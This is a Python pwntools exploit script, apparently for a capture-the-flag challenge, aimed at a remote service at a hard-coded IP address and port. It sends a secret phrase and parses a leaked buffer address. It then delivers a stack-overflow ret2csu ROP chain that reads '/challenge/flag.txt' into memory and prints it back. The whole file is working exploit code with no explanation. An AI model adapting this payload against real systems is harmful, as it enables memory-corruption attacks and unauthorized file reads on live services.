#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
got_read = 0x403250
got_open = 0x403278
bss_path = 0x404100
bss_data = 0x404200

# Test: 1 CSU call only (read stdin → bss) → puts(bss) → main
rop = b'A' * 72
rop += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(40) + p64(got_read)
rop += p64(csu_call) + p64(0) + p64(0)*6
rop += p64(pop_rdi) + p64(bss_path)
rop += p64(0x401040)   # puts
rop += p64(0x401393)   # main

r.send(rop)
import time
time.sleep(0.3)
r.send(b'/challenge/flag.txt\x00')
time.sleep(1)
try:
    data = r.recv(timeout=4)
    print(f'1 CSU: {data[:200]}')
    if b'challenge' in data or b'flag' in data:
        print('1 CSU works!')
    elif b'Spooktober' in data or b'mask' in data:
        print('1 CSU works (reached main)')
except Exception as e:
    print(f'1 CSU: {e}')
r.close()
